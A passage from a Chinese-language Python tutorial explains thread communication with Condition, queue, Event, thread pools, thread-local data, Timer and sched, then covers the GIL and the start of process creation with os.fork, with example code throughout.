导致当前线程进入Condition的等待池等待通知并释放锁,直到其他线程调用该Condition的notify()或notify_all()方法来唤醒该线程。在调用该wait()方法时可传入一个timeout参数,指定该线程最多等待多少秒。

notify()
唤醒在该Condition等待池中的单个线程并通知它,收到通知的线程将自动调用acquire()方法尝试加锁。如果所有线程都在该Condition等待池中等待,则会选择唤醒其中一个线程,选择是任意性的。

notify_all()
唤醒在该Condition等待池中等待的所有线程并通知它们。

本例程序中,可以通过一个旗标来标识账户中是否已有存款,当旗标为False时表明账户中没有存款,存款者线程可以向下执行,当存款者把钱存入账户中后将旗标设为True,并调用Condition的notify()或notify_all()方法来唤醒其他线程。

当存款者线程进入线程体后,如果旗标为True就调用Condition的wait()方法让该线程等待。当旗标为True时表明账户中已经存入了钱,取钱者线程可以向下执行,当取钱者把钱从账户中取出后,将旗标设为False,并调用Condition的notify()或notify_all()方法来唤醒其他线程;当取钱者线程进入线程体后,如果旗标为False,就调用wait()方法让该线程等待。

</pre>本程序为Account类提供了draw()和deposit()两个方法,分别对应于该账户的取钱和存款操作。因为这两个方法可能需要并发修改Account类的self.balance成员变量的值,所以它们都使用Lock来控制线程安全。此外这两个方法还使用了Condition的wait()和notify_all()来控制线程通信;<textarea>
import threading

class Account:
    # 定义构造器
    def __init__(self, account_no, balance):
        # 封装账户编号、账户余额的两个成员变量
        self.account_no = account_no
        self._balance = balance
        self.cond = threading.Condition()
        self._flag = False             # 定义代表是否已经存钱的旗标

    # 因为账户余额不允许随便修改,所以只为self._balance提供getter方法
    def getBalance(self):
        return self._balance

    # 提供一个线程安全的draw()方法来完成取钱操作
    def draw(self, draw_amount):
        self.cond.acquire()             # 加锁,相当于调用Condition绑定的Lock的acquire()
        try:
            # 如果self._flag为假,表明账户中还没有人存钱进去,取钱方法阻塞
            if not self._flag:
                self.cond.wait()
            else:
                # 执行取钱操作
                print(threading.current_thread().name + " 取钱:" +  str(draw_amount), end='')
                self._balance -= draw_amount
                print("账户余额为:" + str(self._balance))
                self._flag = False      # 将标识账户是否已有存款的旗标设为False
                self.cond.notify_all()  # 唤醒其他线程
        finally:                        # 使用finally块来释放锁
            self.cond.release()

    # 提供一个线程安全的deposit()方法来完成存钱操作
    def deposit(self, deposit_amount):
        self.cond.acquire()             # 加锁,相当于调用Condition绑定的Lock的acquire()
        try:
            # 如果self._flag为真,表明账户中已有人存钱进去,存钱方法阻塞
            if self._flag:              # ①
                self.cond.wait()
            else:
                # 执行存款操作
                print(threading.current_thread().name + " 存款:" +  str(deposit_amount), end='')
                self._balance += deposit_amount
                print("账户余额为:" + str(self._balance))
                self._flag = True       # 将表示账户是否已有存款的旗标设为True
                self.cond.notify_all()  # 唤醒其他线程
        finally:                        # 使用finally块来释放锁
            self.cond.release()

#  定义一个函数,模拟重复max次执行取钱操作
def draw_many(account, draw_amount, max):
    for i in range(max):
        account.draw(draw_amount)

#  定义一个函数,模拟重复max次执行存款操作
def deposit_many(account, deposit_amount, max):
    for i in range(max):
        account.deposit(deposit_amount)

# 创建一个账户
acct = Account("1234567" , 0)
# 创建、并启动一个"取钱"线程
threading.Thread(name="取钱者", target=draw_many, args=(acct, 800, 100)).start()
# 创建、并启动一个"存款"线程
threading.Thread(name="存款者甲", target=deposit_many, args=(acct , 800, 100)).start();
threading.Thread(name="存款者乙", target=deposit_many, args=(acct , 800, 100)).start()
threading.Thread(name="存款者丙", target=deposit_many, args=(acct , 800, 100)).start()

'''
运行结果:存款者线程、取钱者线程交替执行的情形,每当存款者向账户中存入800元之后,取钱者线程就立即从账户中取出这笔钱。存款完成后账户余额总是800元,取钱结束后账户余额总是0元
3个存款者线程随机地向账户中存钱,只有1个取钱者线程执行取钱操作。只有当取钱者线程取钱后,存款者线程才可以存钱;同理,只有等存款者线程存钱后,取钱者线程才可以取钱
程序最后被阻塞无法继续向下执行。这是因为3个存款者线程共有300次尝试存钱操作,但1个取钱者线程只有100次尝试取钱操作,所以程序最后被阻塞
这里的阻塞并不是死锁,对于这种情况,取钱者线程已经执行结束,而存款者线程只是在等待其他线程来取钱而已,并不是等待其他线程释放同步监视器。不要把死锁和程序阻塞等同起来
'''

</textarea><pre>
【 Python queue队列实现线程通信 线程优先级队列( Queue) 】
python中的queue模块是对数据结构中栈和队列数据结构的封装,把抽象的数据结构封装成类的属性和方法
栈(stack)也可以说是种先进后出队列(First in Last out),这种数据结构是先进后出的特点。
队列(queue)特点是先进先出(First in First out)

queue模块实现了多生产者多消费者的队列,当要求信息必须在多线程间安全交换,这个模块在线程编程时非常有用。Queue模块实现了所有要求的锁机制。Queue模块主要是多线程,保证线程安全使用的

queue模块提供了几个同步的、线程安全的阻塞队列类,这些队列主要用于实现线程通信。queue模块主要提供了三个类分别代表三种队列,主要区别就在于进队列、出队列的不同,包括FIFO(先入先出)队列Queue、LIFO(后入先出)队列LifoQueue和优先级队列PriorityQueue。这些队列都实现了锁原语,能够在多线程中直接使用。可以使用队列来实现线程间的同步

print([e for e in dir(queue) if not e.startswith('_')])
# ['Empty', 'Full', 'LifoQueue', 'PriorityQueue', 'Queue', 'SimpleQueue', 'deque', 'heappop', 'heappush', 'threading', 'time']

class queue.Queue(maxsize=0)
代表FIFO(先进先出)的常规队列,maxsize可以限制队列的大小。如果队列的大小达到队列的上限就会加锁,再次加入元素时就会被阻塞,直到队列中的元素被消费。如果将maxsize设置为0或负数则该队列的大小就是无限制的。

class queue.LifoQueue(maxsize=0)
代表LIFO(后进先出)的队列,与Queue的区别就是出队列的顺序不同。

class PriorityQueue(maxsize=0)
代表优先级队列,优先级最小的元素先出队列。
普通的队列是先进后出或先进先出,但优先队列不一样,它是怎么出的规则不和进入的顺序有关,是和优先级有关,当入队时就会根据这个数据的优先级进行排序,优先级高的就排在前面,然后出队的时候就是先出队

</pre><textarea>
import queue

q = queue.PriorityQueue(4)
q.put((1,'abcb'))
q.put((1,'abc1'))
q.put((1,'abc3'))
q.put((2,'abc4'))

print(q.get())
print(q.get())
print(q.get())
print(q.get())

</textarea><pre>
这三个队列类的属性和方法基本相同,都提供了如下属性和方法:
q.qsize()
返回队列的实际大小,即队列中包含几个元素。

q.empty()
判断队列是否为空,队列为空则返回True,反之False

q.full()
判断队列是否已满,队列已满则返回True,反之False,Queue.full()与maxsize大小对应

q.put(item, block=True, timeout=None)
入队,向队列中放入元素,在队列尾增加数据,block参数是True或False表示如果队列已经满了则阻塞在这里,timeout参数指超时时间,如果被阻塞了那最多阻塞的时间,如果时间超过了则报错。
如果队列己满且block参数为True(阻塞),当前线程被阻塞,timeout指定阻塞时间,timeout设置为None则代表一直阻塞直到该队列的元素被消费;
如果队列己满且block参数为False(不阻塞),则直接引发queue.FULL异常。

q.put_nowait(item)
向队列中放入元素,不阻塞。相当于在put方法中将block参数设置为False
q.put_nowait(23)  # 相当于q.put(23, block=False)

q.get(item, block=True, timeout=None)
出队,从队列中取出元素(消费元素),block参数表示队列为空则阻塞,如果阻塞超过了timeout时间就报错,如果想一直等待就传递None
如果队列已空且block参数为True(阻塞),当前线程被阻塞,timeout指定阻塞时间,如果将timeout设置为None则代表一直阻塞,直到有元素被放入队列中;
如果队列己空且block参数为False(不阻塞),则直接引发queue.EMPTY异常。

q.get_nowait(item)
从队列中取出元素,不阻塞,相当于在get方法中将block参数设置为False
q.get_nowait()  # 相当于q.get(block=False)

两个方法跟踪入队的任务是否被消费者daemon进程完全消费
q.task_done()
表示队列中某个元素被消费进程使用,消费结束发送的信息。每个get()方法会拿到一个任务,其随后调用task_done()表示这个队列的线程的任务完成。就是发送消息告诉完成啦
如果当前的join()当前处于阻塞状态,当前的所有元素执行后都会重启(意味着收到加入queue的每一个对象的task_done()调用的信息)
如果调用的次数操作放入队列的items的个数多的话会触发ValueError异常

q.join()
一直阻塞直到队列中的所有元素都被取出和执行
未完成的个数,只要有元素添加到queue中就会增加。未完成的个数,只要消费者线程调用task_done()表明其被取走,其调用结束。当未完成任务的计数等于0,join()就会不阻塞

</pre><textarea>
import queue
q = queue.Queue(3)  # 调用构造函数,初始化一个大小为3的队列
print(q.empty())    # True,判断队列是否为空,也就是队列中是否有数据
q.put(13, block=True, timeout=5)  # 入队
print(q.full())     # False,判断队列是否满了,这里队列初始化的大小为3
print(q.qsize())    # 1,获取队列当前数据的个数
print(q.get(block=True, timeout=None))
print(q.qsize())    # 0
q.put("Python")
q.put("Python")
q.put("Python")
print("1111111111")
q.put("Python")     # 当程序试图放入第三个元素时,使用put()方法尝试放入元素将会阻塞线程
print("2222222222")

</textarea>启动三个线程来消费主线程在生产的对象<textarea>
import Queue, threading, time

exitFlag = 0

class myThread (threading.Thread):
    def __init__(self, threadID, name, q):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.q = q
    def run(self):
        print("Starting " + self.name)
        process_data(self.name, self.q)
        print("Exiting " + self.name)

def process_data(threadName, q):
    while not exitFlag:
        queueLock.acquire()
        if not workQueue.empty():
            data = q.get()
            queueLock.release()
            print("%s processing %s" % (threadName, data))
        else:
            queueLock.release()
        time.sleep(1)

threadList = ["Thread-1", "Thread-2", "Thread-3"]
nameList = ["One", "Two", "Three", "Four", "Five"]
queueLock = threading.Lock()
workQueue = Queue.Queue(10)
threads = []
threadID = 1

# 创建新线程
for tName in threadList:
    thread = myThread(threadID, tName, workQueue)
    thread.start()
    threads.append(thread)
    threadID += 1

# 填充队列
queueLock.acquire()
for word in nameList:
    workQueue.put(word)
queueLock.release()

# 等待队列清空
while not workQueue.empty():
    pass

# 通知线程是时候退出
exitFlag = 1

# 等待所有线程完成
for t in threads:
    t.join()
print("Exiting Main Thread")

</textarea>利用Queue来实现线程通信<textarea>
import threading, time, queue

def product(bq):
    str_tuple = ("Python", "Kotlin", "Swift")
    for i in range(99):
        print(threading.current_thread().name + "生产者准备生产元组元素！")
        time.sleep(0.2);
        # 尝试放入元素,如果队列已满,则线程被阻塞
        bq.put(str_tuple[i % 3])
        print(threading.current_thread().name + "生产者生产元组元素完成！")

def consume(bq):
    while True:
        print(threading.current_thread().name + "消费者准备消费元组元素！")
        time.sleep(0.2)
        # 尝试取出元素,如果队列已空,则线程被阻塞
        t = bq.get()
        print(threading.current_thread().name + "消费者消费[ %s ]元素完成！" % t)

# 创建一个容量为1的Queue,因此三个生产者线程无法连续放入元素,但只要其中一个生产者线程向该队列中放入元素之后,其他生产者线程就必须等待,等待消费者线程取出Queue队列中的元素
bq = queue.Queue(maxsize=1)
# 启动3个生产者线程
threading.Thread(target=product, args=(bq, )).start()
threading.Thread(target=product, args=(bq, )).start()
threading.Thread(target=product, args=(bq, )).start()
# 启动一个消费者线程
threading.Thread(target=consume, args=(bq, )).start()

</textarea><pre>
双向队列方法
可以把双向队列看做是队列和栈的一个升级版,栈是在一端进行入栈和出站,而队列是在一端入栈一端出栈,而双向队列则是两端都可以进同时也可以出。

</pre><textarea>
import queue

q = queue.deque(3)  # 初始化一个双向队列
q.append(12)        # 右边进
q.pop()             # 右边出
q.appendleft(34)    # 左边进
q.popleft()         # 左边出

</textarea><pre>
【 Python Event实现线程通信 】
Event是一种非常简单的线程通信机制,一个线程发出一个Event,另一个线程可通过该Event被触发。

Event本身管理一个内部旗标,程序可以通过Event的set()方法将该旗标设置为True,也可以调用clear()方法将该旗标设置为False。程序可以调用wait()方法来阻塞当前线程,直到Event的内部旗标被设置为True。

Event提供了如下方法:
is_set():该方法返回Event的内部旗标是否为True。
set():该方法将会把Event的内部旗标设置为True,并唤醒所有处于等待状态的线程。
clear():该方法将Event的内部旗标设置为False,通常接下来会调用wait()方法来阻塞当前线程。
wait(timeout=None):该方法会阻塞当前线程。

</pre><textarea>
import threading, time
event = threading.Event()
def cal(name):
    # 等待事件,进入等待阻塞状态
    print('%s 线程启动' % threading.currentThread().getName())
    print('%s 准备开始计算状态' % name)
    event.wait()    # ①
    # 收到事件后进入运行状态
    print('%s 线程收到通知了.' % threading.currentThread().getName())
    print('%s 正式开始计算！'% name)

# 创建并启动两条线程,它们都会执行到①号代码处都会进入阻塞状态;即使主线程在②号代码处被阻塞,两个子线程也不会向下执行
# 直到主程序执行到最后一行,程序调用了Event的set()方法将Event的内部旗标设直为True,并唤醒所有等待的线程,这两个线程才能向下执行
threading.Thread(target=cal, args=('甲', )).start()
threading.Thread(target=cal, args=("乙", )).start()
time.sleep(2)    #②
print('------------------')
print('主线程发出事件')
event.set()

</textarea>结合Event的内部旗标,同样可实现前面的Account的生产者-消费者效果:存钱线程(生产者)存钱之后,必须等取钱线程(消费者)取钱之后才能继续向下执行;Event实际上优点类似于Condition和旗标的结合体,但Event本身并不带Lock对象,因此如果要实现线程同步还需要额外的Lock对象<textarea>
import threading
class Account:
    # 定义构造器
    def __init__(self, account_no, balance):
        # 封装账户编号、账户余额的两个成员变量
        self.account_no = account_no
        self._balance = balance
        self.lock = threading.Lock()
        self.event = threading.Event()

    # 因为账户余额不允许随便修改,所以只为self._balance提供getter方法
    def getBalance(self):
        return self._balance

    # 提供一个线程安全的draw()方法来完成取钱操作
    def draw(self, draw_amount):
        self.lock.acquire()      # 加锁
        # 如果Event内部旗标为True,表明账户中已有人存钱进去
        if self.event.is_set():
            # 执行取钱操作
            print(threading.current_thread().name + " 取钱:" +  str(draw_amount))
            self._balance -= draw_amount
            print("账户余额为:" + str(self._balance))
            self.event.clear()   # 将Event内部旗标设为False
            self.lock.release()  # 释放加锁
            self.event.wait()    # 阻塞当前线程阻塞
        else:
            self.lock.release()  # 释放加锁
            self.event.wait()    # 阻塞当前线程

    def deposit(self, deposit_amount):
        # 加锁
        self.lock.acquire()
        # 如果Event内部旗标为False,表明账户中还没有人存钱进去
        if not self.event.is_set():
            # 执行存款操作
            print(threading.current_thread().name + " 存款:" +  str(deposit_amount))
            self._balance += deposit_amount
            print("账户余额为:" + str(self._balance))
            self.event.set()      # 将Event内部旗标设为True
            self.lock.release()   # 释放加锁
            self.event.wait()     # 阻塞当前线程阻塞
        else:
            self.lock.release()   # 释放加锁
            self.event.wait()     # 阻塞当前线程阻塞

</textarea>创建了10个子线程,每个子线程分别爬一个网站,一开始所有子线程都是阻塞等待。一旦某个事件发生：例如有人在网页上点了一个按钮,或者某人在命令行输入了一个命令,10个爬虫同时开始工作<textarea>
import threading
import time
class spider(threading.Thread):
    def __init__(self, n, event):
        super().__init__()
        self.n = n
        self.event = event
    def run(self):
        print(f'第{self.n}号爬虫已就位！')
        self.event.wait()
        print(f'信号标记变为True！！第{self.n}号爬虫开始运行')
eve = threading.Event()
for num in range(10):
    crawler = spider(num, eve)
    crawler.start()
input('按下回车键,启动所有爬虫！')
eve.set()
time.sleep(10)


</textarea><pre>
【 线程池 】
系统启动一个新线程的成本是比较高的,因为它涉及与操作系统的交互。在这种情形下使用线程池可以很好地提升性能,尤其是当程序中需要创建大量生存期很短暂的线程时更应该考虑使用线程池。

线程池在系统启动时即创建大量空闲的线程,程序只要将一个函数提交给线程池,线程池就会启动一个空闲的线程来执行它。当该函数执行结束后,该线程并不会死亡,而是再次返回到线程池中变成空闲状态,等待执行下一个函数。

使用线程池可以有效地控制系统中并发线程的数量。当系统中包含有大量的并发线程时,会导致系统性能急剧下降,甚至导致Python解释器崩溃,而线程池的最大线程数参数可以控制系统中并发线程的数量不超过此数

由于线程池实现了上下文管理协议(Context Manage Protocol),因此程序可以使用with语句来管理线程池,这样即可避免手动关闭线程池

线程池的使用
线程池的基类是内置concurrent.futures模块中的Executor,Executor提供了两个子类即ThreadPoolExecutor和ProcessPoolExecutor,其中ThreadPoolExecutor用于创建线程池,而ProcessPoolExecutor用于创建进程池。

如果使用线程池/进程池来管理并发编程,那么只要将相应的task函数提交给线程池/进程池,剩下的事情就由线程池/进程池来搞定。

Exectuor提供了如下常用方法:
submit(fn, *args, **kwargs)
将fn函数提交给线程池。*args代表传给fn函数的参数,*kwargs代表以关键字参数的形式为fn函数传入参数。

map(func, *iterables, timeout=None, chunksize=1)
该函数类似于全局函数map(func, *iterables),只是该函数将会启动多个线程,以异步方式立即对iterables执行map处理。

shutdown(wait=True)
关闭线程池。

程序将task函数提交(submit)给线程池后,submit方法会返回一个Future对象,Future类主要用于获取线程任务函数的返回值。由于线程任务会在新线程中以异步方式执行,因此线程执行的函数相当于一个"将来完成"的任务,所以Python使用Future来代表。

Future提供了如下方法:
cancel():取消该Future代表的线程任务。如果该任务正在执行,不可取消,则该方法返回False;否则程序会取消该任务并返回True
cancelled():返回Future代表的线程任务是否被成功取消。
running():如果该Future代表的线程任务正在执行、不可被取消,该方法返回True。
done():如果该Funture代表的线程任务被成功取消或执行完成,则该方法返回True。
result(timeout=None):获取该Future代表的线程任务最后返回的结果。如果Future代表的线程任务还未完成,该方法将会阻塞当前线程,其中timeout参数指定最多阻塞多少秒。如果没有指定timeout参数,当前线程将一直处于阻塞状态,直到Future代表的任务返回
exception(timeout=None):获取该Future代表的线程任务所引发的异常。如果该任务成功完成,没有异常,则该方法返回None。
add_done_callback(fn):为该Future代表的线程任务注册一个"回调函数",当该任务成功完成时程序会自动触发该fn函数。

在用完一个线程池后,应该调用该线程池的shutdown()方法将启动线程池的关闭序列。调用shutdown()方法后的线程池不再接收新任务,但会将以前所有的已提交任务执行完成。当线程池中的所有任务都执行完成后,该线程池中的所有线程都会死亡。

使用线程池来执行线程任务的步骤如下:
1、调用ThreadPoolExecutor类的构造器创建一个线程池。
2、定义一个普通函数作为线程任务。
3、调用ThreadPoolExecutor对象的submit()方法来提交线程任务。
4、当不想提交任何任务时,调用ThreadPoolExecutor对象的shutdown()方法来关闭线程池

</pre>使用线程池来执行线程任务<textarea>
from concurrent.futures import ThreadPoolExecutor
import threading, time

# 定义一个准备作为线程任务的函数
def action(max):
    my_sum = 0
    for i in range(max):
        print(threading.current_thread().name + '  ' + str(i))
        my_sum += i
    return my_sum


pool = ThreadPoolExecutor(max_workers=2)   # 创建一个包含2条线程的线程池
future1 = pool.submit(action, 50)          # 向线程池提交一个task, 50会作为action()函数的参数
future2 = pool.submit(action, 100)         # 向线程池再提交一个task, 100会作为action()函数的参数
print(future1.done())                      # 判断future1代表的任务是否结束
time.sleep(3)                              # 主程序暂停3秒
print(future2.done())                      # 判断future2代表的任务是否结束
print(future1.result())                    # 查看future1代表的任务返回的结果
print(future2.result())                    # 查看future2代表的任务返回的结果
pool.shutdown()                            # 关闭线程池

</textarea><pre>
如果程序不希望直接调用result()方法阻塞线程,则可通过Future的add_done_callback()方法来添加回调函数,该回调函数形如fn(future)。当线程任务完成后,程序会自动触发该回调函数,并将对应的Future对象作为参数传给该回调函数

</pre>使用add_done_callback()方法来获取线程任务的返回值<textarea>
from concurrent.futures import ThreadPoolExecutor
import threading,time

# 定义一个准备作为线程任务的函数
def action(max):
    my_sum = 0
    for i in range(max):
        print(threading.current_thread().name + '  ' + str(i))
        my_sum += i
    return my_sum

# 创建一个包含2条线程的线程池
with ThreadPoolExecutor(max_workers=2) as pool:
    future1 = pool.submit(action, 50)      # 向线程池提交一个task, 50会作为action()函数的参数
    future2 = pool.submit(action, 100)     # 向线程池再提交一个task, 100会作为action()函数的参数
    def get_result(future):
        print(future.result())
    future1.add_done_callback(get_result)  # 为future1添加线程完成的回调函数
    future2.add_done_callback(get_result)  # 为future2添加线程完成的回调函数
    print('--------------')                # 可能在future返回之前执行

</textarea><pre>
Exectuor提供的map(func, *iterables, timeout=None, chunksize=1)方法类似于全局函数map(),区别在于线程池的map()方法会为iterables的每个元素启动一个线程,以并发方式来执行func函数。这种方式相当于启动len(iterables)个线程,井收集每个线程的执行结果

使用map()方法来启动线程,并收集线程的执行结果,不仅具有代码简单的优点,而且虽然程序会以并发方式来执行action()函数,但最后收集的action()函数的执行结果,依然与传入参数的结果保持一致

</pre>使用Executor的map()方法来启动线程,并收集线程任务的返回值<textarea>
from concurrent.futures import ThreadPoolExecutor
import threading,time

# 定义一个准备作为线程任务的函数
def action(max):
    my_sum = 0
    for i in range(max):
        print(threading.current_thread().name + '  ' + str(i))
        my_sum += i
    return my_sum

# 创建一个包含4条线程的线程池
with ThreadPoolExecutor(max_workers=4) as pool:
    # 使用线程执行map计算,后面元组有3个元素,因此程序启动3条线程来执行action函数
    # 使用map()方法来启动3个线程(该程序的线程池包含4个线程,如果继续使用只包含两个线程的线程池,此时将有一个任务处于等待状态,必须等其中一个任务完成,线程空闲出来才会获得执行的机会),map()方法的返回值将会收集每个线程任务的返回结果
    results = pool.map(action, (50, 100, 150))
    print('--------------')
    for r in results: print(r)

</textarea><pre>
【 threading Local函数用法:返回线程局部变量 】
Python在threading模块下提供了一个local()函数,该函数可以返回一个线程局部变量,通过使用线程局部变量可以很简捷地隔离多线程访问的竞争资源,从而简化多线程井发访问的编程处理。

线程局部变量(Thread Local Variable)的功用非常简单,就是为每一个使用该变量的线程都提供一个变量的副本,使每一个线程都可以独立地改变自己的副本,而不会和其他线程的副本冲突。从线程的角度看,就好像每一个线程都完全拥有该变量一样

线程局部变量和其他同步机制一样,都是为了解决多线程中对共享资源的访问冲突的。在普通的同步机制中,是通过为对象加锁来实现多个线程对共享资源的安全访问的。由于共享资源是多个线程共享的,所以要使用这种同步机制,就需要很细致地分析什么时候对共享资源进行读写,什么时候需要锁定该资源,什么时候释放对该资源的锁定等。在这种情况下系统并没有将这份资源复制多份,只是采用安全机制来控制对这份资源的的访问而已。
线程局部变量从另一个角度来解决多线程的并发访问问题。线程局部变量将需要并发访问的资源复制多份,每个线程都拥有自己的资源副本,从而也就没有必要对该资源进行同步了。线程局部变量提供了线程安全的共享对象,在编写多线程代码时可以把不安全的整个变量放到线程局部变量中,或者把该对象中与线程相关的状态放入线程局部变量中保存。

线程局部变量并不能替代同步机制,两者面向的问题领域不同。同步机制是为了同步多个线程对共享资源的并发访问,是多个线程之间进行通信的有效方式;而线程局部变量是为了隔离多个线程的数据共享,从根本上避免多个钱程之间对共享资源(变量)的竞争,也就不需要对多个线程进行同步了。

通常建议,如果多个线程之间需要共享资源以实现线程通信则使用同步机制;如果仅仅需要隔离多个线程之间的共享冲突,则可以使用线程局部变量。

</pre><textarea>
import threading
from concurrent.futures import ThreadPoolExecutor

# 定义线程局部变量
mydata = threading.local()

# 定义准备作为线程执行体使用的函数
def action (max):
    for i in range(max):
        try:
            mydata.x += i
        except:
            mydata.x = i
        print('%s mydata.x的值为: %d' % (threading.current_thread().name, mydata.x))  # 访问mydata的x的值

# 使用线程池启动两个子线程
with ThreadPoolExecutor(max_workers=2) as pool:
    pool.submit(action , 10)
    pool.submit(action , 10)

</textarea><pre>
【 Timer定时器:控制函数在特定时间执行 】
threading类有一个Timer子类,该子类可用于控制指定函数在特定时间内执行一次,如果要使用Timer控制函数多次重复执行则需要再执行下一次调度
如果程序想取消Timer的调度,则可调用Timer对象的cancel()函数

</pre><textarea>
from threading import Timer
def hello():
    print("hello, world")
t = Timer(10.0, hello)  # 指定10秒后执行hello函数
t.start()

</textarea>控制print_time()函数多次重复执行<textarea>
from threading import Timer
import time

count = 0   # 定义总共输出几次的计数器

def print_time():
    print("当前时间:%s" % time.ctime())
    global t, count
    count += 1
    # 如果count小于10,开始下一次调度
    if count < 10:
        t = Timer(1, print_time)
        t.start()

# 指定1秒后执行print_time函数
t = Timer(1, print_time)
t.start()

</textarea><pre>
【 schedule任务调度及其用法 】
如果需要执行更复杂的任务调度则可使用Python提供的sched模块,该模块提供了sched.scheduler类代表一个任务调度器。

sched.scheduler(timefunc=time.monotonic, delayfunc=time.sleep)
timefunc:该参数指定生成时间戳的时间函数,默认使用time.monotonic来生成时间戳。
delayfunc:该参数指定阻塞程序的函数,默认使用time.sleep函数来阻塞程序。

sched.scheduler调度器支持如下常用属性和方法:
scheduler.enterabs(time, priority, action, argument=(), kwargs={})
指定在time时间点执行action函数,argument和kwargs都用于向action函数传入参数,其中argument使用位置参数的形式传入参数,kwargs使用关键字参数的形式传入参数。该方法返回一个event,它可作为cancel()方法的参数用于取消该调度。priority参数指定该任务的优先级,当在同一个时间点有多个任务需要执行时,优先级高(值越小代表优先级越高)的任务会优先执行。

scheduler.enter(delay, priority, action, argument=(),kwargs={})
该方法与enterabs方法基本相同,只是delay参数用于指定多少秒之后执行action任务。

scheduler.cancel(event)
取消任务。如果传入的event参数不是当前调度队列中的event程序将会引发ValueError异常。

scheduler.empty()
判断当前该调度器的调度队列是否为空。

scheduler.run(blocking=True)
运行所有需要调度的任务。如果调用该方法的blocking参数为True,该方法将会阻塞线程,直到所有被调度的任务都执行完成。

scheduler.queue
该只读属性返回该调度器的调度队列

</pre>使用sched.scheduler来执行任务调度<textarea>
import sched, time, threading

# 定义线程调度器
s = sched.scheduler()

# 定义被调度的函数
def print_time(name='default'):
    print("%s 的时间: %s" % (name, time.ctime()))

print('主线程:', time.ctime())
s.enter(10, 1, print_time)                               # 指定10秒之后执行print_time函数
s.enter(5, 2, print_time, argument=('位置参数',))         # 指定5秒之后执行print_time函数,优先级为2
s.enter(5, 1, print_time, kwargs={'name': '关键字参数'})  # 指定5秒之后执行print_time函数,优先级为1
s.run()                                                  # 执行调度的任务
print('主线程:', time.ctime())

'''
主线程: Sun Aug  4 11:05:24 2019
位置参数 的时间: Sun Aug  4 11:05:29 2019
关键字参数 的时间: Sun Aug  4 11:05:29 2019
default 的时间: Sun Aug  4 11:05:34 2019
主线程: Sun Aug  4 11:05:34 2019
'''

</textarea>sched.scheduler优先级调度器实现优先级队列/延迟队列和定时队列<textarea>
import sched

def do_work(name):
    print(f'你好：{name}')

sch = sched.scheduler()
sch.enter(5, 2, do_work, argument=('产品经理', ))
sch.enter(5, 1, do_work, argument=('kingname', ))
sch.run()

# 只有当两个任务同时运行的时候,才会检查优先级。如果两个任务触发的时间一前一后,那么还轮不到比较优先级;由于延迟队列的延迟是相对于当前运行这一行代码的时间来计算的,后一行代码比前一行代码晚了几毫秒,所以实际上产品经理这一行会先到时间,所以就会先运行

import sched
import time
import datetime

def do_work(name):
    print(f'你好：{name}')

sch = sched.scheduler(time.time, time.sleep)
start_time = datetime.datetime.now() + datetime.timedelta(seconds=10)
start_time_ts = start_time.timestamp()
sch.enterabs(start_time_ts, 2, do_work, argument=('产品经理', ))  # 使用绝对的精确时间
sch.enterabs(start_time_ts, 1, do_work, argument=('kingname', ))
sch.run()

</textarea><pre>
【 多核CPU 】
如果有一个多核CPU,多核应该可以同时执行多个线程,如果写一个死循环的话会出现什么情况呢？
打开Windows的Task Manager都可以监控某个进程的CPU使用率。可以监控到一个死循环线程会100%占用一个CPU。
如果有两个死循环线程,在多核CPU中,可以监控到会占用200%的CPU,也就是占用两个CPU核心。
要想把N核CPU的核心全部跑满,就必须启动N个死循环线程。

</pre><textarea>
import threading, multiprocessing

def loop():
    x = 0
    while True:
        x = x ^ 1

for i in range(multiprocessing.cpu_count()):
    t = threading.Thread(target=loop)
    t.start()

</textarea><pre>
启动与CPU核心数量相同的N个线程,在4核CPU上可以监控到CPU占用率仅有102%,也就是仅使用了一核。
但用C、C++或Java来改写相同的死循环,直接可以把全部核心跑满,4核就跑到400%,8核就跑到800%,为什么Python不行呢？
因为Python的线程虽然是真正的线程,但解释器执行代码时有一个GIL锁:Global Interpreter Lock,任何Python线程执行前必须先获得GIL锁,然后每执行100条字节码,解释器就自动释放GIL锁,让别的线程有机会执行。这个GIL全局锁实际上把所有线程的执行代码都给上了锁,所以多线程在Python中只能交替执行,即使100个线程跑在100核CPU上,也只能用到1个核。
GIL是Python解释器设计的历史遗留问题,通常用的解释器是官方实现的CPython,要真正利用多核,除非重写一个不带GIL的解释器。
所以在Python中可以使用多线程,但不要指望能有效利用多核。如果一定要通过多线程利用多核,那只能通过C扩展来实现,不过这样就失去了Python简单易用的特点。
不过也不用过于担心,Python虽然不能利用多线程实现多核任务,但可以通过多进程实现多核任务。多个Python进程有各自独立的GIL锁,互不影响

</pre>
</div>

<div id="process">
<h4>多进程</h4><pre>
除可以进行多线程编程之外,Python还支持使用多进程来实现并发编程。

【 fork方法:创建新进程 】
Only works on Unix/Linux/Mac: 由于Windows没有fork调用,fork在Windows上无法运行。由于Mac系统是基于BSD(Unix的一种)内核,所以在Mac下运行是没有问题的

Unix/Linux操作系统提供了一个fork()系统调用,它非常特殊。普通的函数调用一次返回一次,但是fork()调用一次返回两次,因为操作系统自动把当前进程(称为父进程)复制了一份(称为子进程),然后分别在父进程和子进程内返回。
子进程永远返回0,而父进程返回子进程的ID。这样做的理由是,一个父进程可以fork出很多子进程,所以父进程要记下每个子进程的ID,而子进程只需要调用getppid()就可以拿到父进程的ID

Python的os模块封装了常见的系统调用,其中就包括fork,可以在Python程序中轻松创建子进程
有了fork调用,一个进程在接到新任务时就可以复制出一个子进程来处理新任务,常见的Apache服务器就是由父进程监听端口,每当有新的http请求时,就fork出子进程来处理新的http请求

Python的os模块提供了一个fork()方法,该方法可以fork出来一个子进程。简单来说,fork()方法的作用在于,程序会启动两个进程(一个是父进程,一个是fork出来的子进程)来执行从os.fork()开始的所有代码。

fork()方法不需要参数,它有一个返回值,该返回值表明是哪个进程在执行:
如果fork()方法返回 0,则表明是fork出来的子进程在执行。
如果fork()方法返回非0,则表明是父进程在执行,该方法返回fork()出来的子进程的进程ID

在实际编程中,程序可通过fork()方法来创建一个子进程,然后通过判断fork()方法的返回值来确定程序是否正在执行子进程,也就是把需要并发执行的任务放在if pid==0:的条件执行体中,这样就可以启动多个子进程来执行并发任务

</pre><textarea>
import os
print('父进程(%s)开始执行' % os.getpid())
# 开始fork一个子进程,从这行代码开始,下面代码都会被两个进程执行,程序会分别使用父进程和子进程来执行从此行代码开始的代码
pid = os.fork()
print('进程进入:%s' % os.getpid())
# 如果pid为0表明子进程
if pid == 0:
    print('子进程,其ID为 (%s),父进程ID为 (%s)' % (os.getpid(), os.getppid()))
else:
